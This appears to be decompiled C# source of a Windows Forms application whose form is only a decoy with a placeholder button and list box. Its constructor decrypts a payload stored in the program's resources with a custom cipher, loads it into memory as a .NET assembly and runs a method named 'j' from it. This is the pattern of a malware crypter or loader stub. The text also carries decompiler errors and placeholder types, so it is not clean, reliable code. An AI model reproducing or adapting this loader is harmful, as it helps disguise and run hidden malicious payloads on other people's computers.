using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Printing;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using kldsuzji.My.Resources;

namespace kldsuzji;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	[AccessedThroughProperty("NotifyIcon1")]
	private NotifyIcon _NotifyIcon1;

	[AccessedThroughProperty("ListBox2")]
	private ListBox _ListBox2;

	[AccessedThroughProperty("PrintDocument1")]
	private PrintDocument _PrintDocument1;

	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	[AccessedThroughProperty("ToolTip1")]
	private ToolTip _ToolTip1;

	private object horse;

	private MethodInfo ton;

	private Type t;

	private byte[] b;

	internal virtual _003F NotifyIcon_0
	{
		get
		{
			return _NotifyIcon1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_NotifyIcon1 = value;
		}
	}

	internal virtual _003F ListBox2
	{
		get
		{
			return _ListBox2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ListBox2 = value;
		}
	}

	internal virtual _003F PrintDocument_0
	{
		get
		{
			return _PrintDocument1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_PrintDocument1 = value;
		}
	}

	internal virtual _003F Button1
	{
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Button1 = value;
		}
	}

	internal virtual _003F ToolTip_0
	{
		get
		{
			return _ToolTip1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ToolTip1 = value;
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_0044: Unknown result type (might be due to invalid IL or missing references)
		//IL_004e: Expected O, but got Unknown
		components = new Container();
		NotifyIcon_0 = new NotifyIcon(components);
		ListBox2 = new ListBox();
		PrintDocument_0 = new PrintDocument();
		Button1 = new Button();
		ToolTip_0 = new ToolTip(components);
		((Control)this).SuspendLayout();
		((NotifyIcon)NotifyIcon_0).set_Text("NotifyIcon1");
		((NotifyIcon)NotifyIcon_0).set_Visible(true);
		((ListControl)ListBox2).set_FormattingEnabled(true);
		object listBox = (object)ListBox2;
		Point location = new Point(310, 88);
		((Control)listBox).set_Location(location);
		((Control)ListBox2).set_Name("ListBox2");
		object listBox2 = (object)ListBox2;
		Size size = new Size(120, 95);
		((Control)listBox2).set_Size(size);
		((Control)ListBox2).set_TabIndex(7);
		object button = (object)Button1;
		location = new Point(122, 204);
		((Control)button).set_Location(location);
		((Control)Button1).set_Name("Button1");
		object button2 = (object)Button1;
		size = new Size(75, 23);
		((Control)button2).set_Size(size);
		((Control)Button1).set_TabIndex(8);
		((ButtonBase)Button1).set_Text("Button1");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		((Control)this).set_AllowDrop(true);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(SystemColors.ControlDarkDark);
		size = new Size(636, 284);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)Button1);
		((Control)this).get_Controls().Add((Control)ListBox2);
		((Control)this).set_Name("Form1");
		((Form)this).set_Text("Form1");
		((Control)this).ResumeLayout(false);
	}

	public static int momo(int nb)
	{
		return nb % 256;
	}

	public static byte[] Decrypt(byte[] input, int key)
	{
		checked
		{
			int num = input.Length - 2;
			for (int i = 0; i <= num; i += 2)
			{
				int num2 = input[i];
				int num3 = input[i + 1];
				int j = 2 * num3 - key - num2;
				int k;
				for (k = key - num2 + num3; k < 0; k += 256)
				{
				}
				for (; j < 0; j += 256)
				{
				}
				input[i] = (byte)momo(k);
				input[i + 1] = (byte)momo(j);
			}
			return input;
		}
	}

	public Type GetTypes(Assembly a)
	{
		return a.GetTypes()[5];
	}

	public Assembly aslo(byte[] a)
	{
		return AppDomain.CurrentDomain.Load(a);
	}

	public Form1()
	{
		horse = new object[0];
		InitializeComponent();
		b = Decrypt((byte[])((ResourceManager)Resources.unknown_0).GetObject((string)Resources.unknown_3), Conversions.ToInteger((string)Resources.unknown_2));
		t = GetTypes(aslo(b));
		MethodInfo[] methods = t.GetMethods();
		foreach (MethodInfo methodInfo in methods)
		{
			if (Operators.CompareString(methodInfo.Name, "j", false) == 0)
			{
				methodInfo.Invoke(null, (object[])horse);
			}
		}
	}

	static void smethod_0()
	{
		/*Error: Unexpected end of block*/;
	}
}
